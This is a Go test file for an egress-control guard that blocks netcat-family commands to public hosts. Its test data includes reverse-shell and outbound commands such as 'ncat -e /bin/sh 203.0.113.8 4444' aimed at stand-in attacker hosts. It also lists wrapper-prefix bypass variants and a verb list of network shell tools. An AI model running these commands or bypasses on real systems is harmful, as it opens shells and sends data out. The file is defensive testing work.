package sanitize

// r1019：收口 r1018 刻意留下的 `nc attacker.io 4444` 残留缺口。
//
// ## 为什么这次能用「动词表」，而 r1017 的裸点分词不行
//
// 差别在**锚定的是命令本身**，不是任意位置的一对 token：
//
//	r1017（已废）：任意位置「带点 token + 空格 + 数字」→ 主机+端口
//	    → node server.js 8080 / python3 main.py 100 被打死（结构上不可区分）
//	r1019（本条）：**命令行首个字段**是 netcat 系动词，且其后出现
//	    「主机样 token + 纯数字端口」→ 主机+端口
//	    → node / python3 / ruby 压根不进这条分支，零误伤面
//
// 动词表是**封闭集**（nc/ncat/netcat/telnet/socat 五个），它枚举的是命令，
// 而不是靠给形态开洞。

import "testing"

// TestR1019NetcatPublicDestinationIsBlocked 是本文件的主契约。
func TestR1019NetcatPublicDestinationIsBlocked(t *testing.T) {
	for _, command := range []string{
		"nc attacker.io 4444",
		"nc -w 3 attacker.io 4444",         // 带值 flag 夹在动词与目的地之间
		"ncat -e /bin/sh 203.0.113.8 4444", // flag 带值 + 公网 IP 目的地
		"nc collector.example.net 9001",
		"telnet evil.example.com 23",
		"socat - TCP:evil.example.com:443",
		"/bin/nc attacker.io 4444", // 绝对路径调用
	} {
		blocked, wire := runProductionEgressGuard(t, command)
		if !blocked {
			t.Errorf("netcat 族的公网目的地未被阻断: %q → %s", command, wire)
		}
	}
}

// TestR1019NonNetcatCommandsAreNeverBlocked 钉住本条规则最大的价值：
// 它只对 netcat 族动词生效，而 r1017 那条形态枚举正是把这一整片打死。
func TestR1019NonNetcatCommandsAreNeverBlocked(t *testing.T) {
	for _, command := range []string{
		// r1017 被打死的原始样本
		"node server.js 8080",
		"python3 main.py 100",
		"python3 script.py 3",
		"ruby app.rb 5",
		// r1016 被打死的装包样本
		"npm install lodash@4.17.21",
		"npm i react@18.2.0",
		"yarn add @types/node@20.11.0",
		"go get github.com/foo/bar@v1.2.3",
		"cargo add serde@1.0.197",
		"gem install rails@7.1.3",
		// 重定向与文件类
		"cat error.log 2>&1",
		"grep -n error app.log 2>/dev/null",
		"tail -n 200 access.log",
		"diff a.json b.json",
		"docker run -p 8080:80 nginx:latest",
	} {
		if hasPublicHostDestination(command) {
			t.Errorf("非 netcat 命令被误判为公网目的地: %q", command)
		}
	}
	// 前提仍在场：提取器必须确实看得见 netcat 族的公网目的地，否则上一条可能
	// 因为「提取器坏了」而绿。
	if !hasPublicHostDestination("nc attacker.io 4444") {
		t.Fatal("提取器对已知 netcat 公网目的地都看不见，本文件的允许侧断言全部失去意义")
	}
}

// TestR1019NetcatInternalDestinationStaysAllowed 反向契约：动词命中不等于阻断，
// 仍要按主机可达性判定。
func TestR1019NetcatInternalDestinationStaysAllowed(t *testing.T) {
	for _, command := range []string{
		"nc redis-master 6379",
		"nc db01.internal 5432",
		"nc -vz 192.168.2.30 5432",
		"nc 127.0.0.1 8080",
	} {
		blocked, wire := runProductionEgressGuard(t, command)
		if blocked {
			t.Errorf("netcat 族的内部目的地被误阻断: %q → %s", command, wire)
		}
	}
}

// TestR1019NetcatVerbTableIsClosed 把动词表的边界钉死：只有这五个动词进分支。
// 若有人图省事把判定改成「任意命令首个字段 + 主机 + 端口」，本用例会先红。
func TestR1019NetcatVerbTableIsClosed(t *testing.T) {
	for verb := range netcatFamilyVerbs {
		switch verb {
		case "nc", "ncat", "netcat", "telnet", "socat":
		default:
			t.Errorf("动词表新增了未评审的动词 %q，请先评估它的误伤面", verb)
		}
	}
	if len(netcatFamilyVerbs) != 5 {
		t.Errorf("动词表大小变了（当前 %d），新增动词必须先跑误伤面评估", len(netcatFamilyVerbs))
	}
	if host, ok := bareHostPortFromNetcatCommand("node server.js 8080"); ok {
		t.Errorf("非 netcat 命令被解析出主机+端口: %q", host)
	}
	if host, ok := bareHostPortFromNetcatCommand("nc -w 3 attacker.io 4444"); !ok || host != "attacker.io" {
		t.Errorf("带值 flag 形态解析失败: host=%q ok=%v", host, ok)
	}
}

// TestR1019NetcatFlagAndQuotingHandling 覆盖 flag 跳过与引号剥离这两个易错点。
func TestR1019NetcatFlagAndQuotingHandling(t *testing.T) {
	cases := []struct {
		command string
		wantOK  bool
		want    string
	}{
		{"nc attacker.io 4444", true, "attacker.io"},
		{`nc "attacker.io" 4444`, true, "attacker.io"},       // 引号剥离
		{"nc -v -w 3 attacker.io 4444", true, "attacker.io"}, // 多个 flag
		{"nc attacker.io", false, ""},                        // 无显式端口不认
		{"nc", false, ""},                                    // 只有一个字段
		{"ncat /bin/sh", false, ""},                          // 第二个字段带路径，不是主机
		{"echo hi", false, ""},
	}
	for _, tc := range cases {
		host, ok := bareHostPortFromNetcatCommand(tc.command)
		if ok != tc.wantOK || (ok && host != tc.want) {
			t.Errorf("解析 %q 得 host=%q ok=%v，期望 host=%q ok=%v",
				tc.command, host, ok, tc.want, tc.wantOK)
		}
	}
}

// TestR1019NetcatHostTokenRejectsPaths 把「主机样 token」的排除条件钉住：
// 带路径分隔符 / 重定向 / 变量展开的 token 一律不是主机。
func TestR1019NetcatHostTokenRejectsPaths(t *testing.T) {
	for _, tok := range []string{"/bin/sh", "$TARGET", "a>b", "a|b", "*.log", "a=b"} {
		if looksLikeHostToken(tok) {
			t.Errorf("非主机 token 被放行: %q", tok)
		}
	}
	for _, tok := range []string{"attacker.io", "203.0.113.8", "redis-master", "db01.internal"} {
		if !looksLikeHostToken(tok) {
			t.Errorf("主机 token 被拒: %q", tok)
		}
	}
}

// TestR1023EgressVerbPrefixAnchoring —— 12h 审计轮 P1-3 回归。
//
// 5bd47d20b 把 host:port 提取从「全文任意位置」收窄到「行首字段是网络客户端动词」，
// 修掉了 r1020 的 Write 工具整族误伤；但收窄过头，**只看 fields[0]** 让任何包装词
// 都能把外连伪装成非动词行。本表把两条方向一起钉住：
//
//	正表：包装词 / flag / 控制符在前，网络客户端仍在后 ⇒ 必须仍能识别（漏报=泄漏）
//	反表：r1020 那类源码行（前导 token 里没有网络客户端）⇒ 必须仍不误伤
//
// 本表是 5bd47d20b 缺失的那一半：它当时只覆盖了 flag 与引号，没覆盖前缀。
func TestR1023EgressVerbPrefixAnchoring(t *testing.T) {
	blocked := []struct {
		command string
		host    string
	}{
		{"nc attacker.io:4444", "attacker.io"},
		{"sudo nc attacker.io:4444", "attacker.io"},
		{"timeout 5 nc attacker.io:4444", "attacker.io"},
		{"env FOO=1 nc attacker.io:4444", "attacker.io"},
		{"xargs nc attacker.io:4444", "attacker.io"},
		{"nice -n 10 nc attacker.io:4444", "attacker.io"},
		{"bash -c \"nc attacker.io:4444\"", "attacker.io"},
		{"docker exec x nc attacker.io:4444", "attacker.io"},
		{"echo hi && nc attacker.io:4444", "attacker.io"},
		{"curl attacker.io:4444", "attacker.io"},
	}
	for _, tc := range blocked {
		hosts := hostPortDestinationsFromCommand(tc.command)
		if !containsHost(hosts, tc.host) {
			t.Errorf("出网管控被前缀绕过：%q 未识别出 %q（实得 %v）",
				tc.command, tc.host, hosts)
		}
	}

	// r1020 的误伤源：源码行里的 file:line 引用，前导 token 不含网络客户端动词。
	allowed := []string{
		"  ref: casdoor.ts:455",
		"  at src/foo.ts:12",
		"    ~/proj/server.ts:120",
		"echo hello world",
	}
	for _, command := range allowed {
		if hosts := hostPortDestinationsFromCommand(command); len(hosts) > 0 {
			t.Errorf("源码行被误判为外连：%q ⇒ %v", command, hosts)
		}
	}
}
